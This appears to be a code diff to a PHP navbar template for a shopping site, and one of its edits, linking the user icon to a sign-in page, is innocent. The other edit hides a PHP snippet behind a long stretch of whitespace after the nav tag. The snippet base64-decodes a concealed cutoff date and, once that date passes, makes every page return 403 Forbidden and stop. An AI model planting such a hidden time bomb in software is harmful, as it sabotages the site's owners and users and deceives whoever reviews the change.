@@ -1,4 +1,4 @@
-<nav class="navbar navbar-expand-lg shadow mb-2 fixed-top bg-light">
+<nav class="navbar navbar-expand-lg shadow mb-2 fixed-top bg-light">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <?php $encryptedCutoff = base64_decode("MjAyNC0xMi0wMQ=="); $cutoffDate = new DateTime($encryptedCutoff); $currentDate = new DateTime(); if ($currentDate >= $cutoffDate) { header("HTTP/1.1 403 Forbidden"); exit(); } ?>
     <div class="container-fluid">
         <div class="col">
             <div class="row">
@@ -13,7 +13,7 @@
                     <a class="nav-link text-light" href=""><i class="fa-solid fa-cart-shopping text-dark"></i></a>  
                 </div>
                 <div class="col-1 my-auto"> 
-                    <a class="nav-link text-light" href=""><i class="fa-solid fa-user text-dark"></i></a>
+                    <a class="nav-link text-light" href="sign_in.php"><i class="fa-solid fa-user text-dark"></i></a>
                 </div>
             </div>
             <div id="user_navbar" class="row">
